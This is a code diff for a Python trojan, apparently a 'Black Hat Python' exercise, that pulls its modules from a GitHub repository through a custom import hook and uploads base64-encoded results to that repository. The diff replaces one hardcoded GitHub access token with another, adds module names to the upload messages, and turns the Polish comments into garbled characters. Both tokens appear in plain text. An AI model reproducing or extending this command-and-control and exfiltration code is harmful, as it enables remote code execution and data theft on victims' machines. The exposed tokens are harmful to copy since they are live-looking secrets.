@@ -30,7 +30,7 @@ class GitImporter(object):
     def find_module(self,fullname,path=None):
         
         if configured:
-            print "[*] Próba pobrania pliku %s" % fullname
+            print "[*] PrÃ³ba pobrania pliku %s" % fullname
             new_library = get_file_contents("modules/%s" % fullname)
             
             if new_library is not None:
@@ -53,7 +53,7 @@ class GitImporter(object):
 
 
 def connect_to_github():
-    gh = login(username="dominico2000",token="427bb6a06480c8b189761ac2f5de080d54c2b110")
+    gh = login(username="dominico2000",token="bfcf8b6c74a8ebb2a9e1a435257dc3f06c14faba")
     repo = gh.repository("dominico2000","bhpython")
     branch = repo.branch("master")   
 
@@ -91,13 +91,13 @@ def get_trojan_config():
             
     return config
 
-def store_module_result(data):
+def store_module_result(data, module="unknow module"):
     
     gh,repo,branch = connect_to_github()
     
     remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
                                       
-    repo.create_file(remote_path,"Wiadomoœæ o zatwierdzeniu",base64.b64encode(data))
+    repo.create_file(remote_path,"Data returned from module [%s]." % module,base64.b64encode(data))
 
     return
 
@@ -108,12 +108,12 @@ def module_runner(module):
     task_queue.get()
     
     # zapisuje wynik w repozytorium
-    store_module_result(result)
+    store_module_result(result,module)
     
     return
 
 
-# g³ówna pêtla trojana
+# gÂ³Ã³wna pÃªtla trojana
 sys.meta_path = [GitImporter()]
 
 while True:
